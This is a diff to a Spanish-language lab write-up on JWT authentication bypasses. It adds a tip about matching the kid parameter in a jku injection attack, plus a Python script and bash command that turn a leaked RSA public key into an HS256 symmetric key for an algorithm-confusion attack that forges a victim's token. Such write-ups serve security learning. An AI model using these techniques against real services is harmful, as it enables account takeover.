@@ -226,6 +226,8 @@ En la cabecera del token JWT inyectamos el parámetro `jku` con la URL de nuestr
 
 Cambiamos el usuario en el _Payload_ a la víctima, firmamos con nuestra clave privada en Burp y enviamos.
 
+>!Importante: Que coincida los parametros `kid`, yo he usado en el sign `update alg, type and kid`
+
 ---
 
 ## 7. Bypass de autenticación JWT con traversal en kid
@@ -289,6 +291,62 @@ Plaintext
 ```
 
 Firmamos en la pestaña _JSON Web Token_ usando la clave simétrica que acabamos de crear a partir del PEM y logramos el bypass.
+
+### Modo Manual:
+
+script en python donde generar la PEM public key:
+
+```python
+import base64
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import serialization
+
+# Datos extraídos de tu JSON || OBLIGATORIO adaptar el parametro 'n' y 'e' con la key publica encontrada
+n_str = "mASBNX4gBg7uLaFnn2O4ms4Q7IwnCWaL7ciqvonMbJe1bHwfFdKWl7tBPPtcnD2W4oZrtEGXO7R1lvZD-ajA4w9T2ddwejScFsw6QizUyebqPY2eDOW4wx5z7udBfRIr9iNC3GdOa5WXZp6vNOjKiGFD-nWpjpyAmHWN4-925Vq6l0umlIwBV-E5d2neaL_COnZ9Cf65xyW2FCB-ds8qHiZC3vam4YyMuBIdux53A79VZSKT0m8wdtzzfCfy0YhBKm5G5mtis0gMup4j7u7NIL1WCw940zUSyge6cn8d0hnfuA3ETxgepmOiWBXvfhekPhQZDe4QFd93Kdzykjbqlw"
+e_str = "AQAB"
+
+def b64_to_int(data):
+    # Paso de Base64URL a Base64 estándar
+    data = data.replace('-', '+').replace('_', '/')
+    # Añadir padding si es necesario
+    missing_padding = len(data) % 4
+    if missing_padding:
+        data += '=' * (4 - missing_padding)
+    return int.from_bytes(base64.b64decode(data), 'big')
+
+# Convertir n y e a enteros
+n = b64_to_int(n_str)
+e = b64_to_int(e_str)
+
+# Crear la estructura de la clave pública
+public_key = rsa.RSAPublicNumbers(e, n).public_key()
+
+# Exportar a formato PEM
+pem = public_key.public_bytes(
+    encoding=serialization.Encoding.PEM,
+    format=serialization.PublicFormat.SubjectPublicKeyInfo
+)
+
+print(pem.decode())
+```
+
+La salida del script se convierte a base64:
+
+>!Importante mantener los saltos de linea.
+
+```bash
+echo '-----BEGIN PUBLIC KEY-----                                                                                                                            ─╯
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmASBNX4gBg7uLaFnn2O4
+ms4Q7IwnCWaL7ciqvonMbJe1bHwfFdKWl7tBPPtcnD2W4oZrtEGXO7R1lvZD+ajA
+4w9T2ddwejScFsw6QizUyebqPY2eDOW4wx5z7udBfRIr9iNC3GdOa5WXZp6vNOjK
+iGFD+nWpjpyAmHWN4+925Vq6l0umlIwBV+E5d2neaL/COnZ9Cf65xyW2FCB+ds8q
+HiZC3vam4YyMuBIdux53A79VZSKT0m8wdtzzfCfy0YhBKm5G5mtis0gMup4j7u7N
+IL1WCw940zUSyge6cn8d0hnfuA3ETxgepmOiWBXvfhekPhQZDe4QFd93Kdzykjbq
+lwIDAQAB
+-----END PUBLIC KEY-----' | base64 -w 0 && echo
+```
+
+La salida del comando en base64 hay que añadirla al parametro `k` de una nueva clave simetrica con la firmaremos a continuación el token JWT cambiando el usuario y el `alg` por `HS256`
 
 ---
 
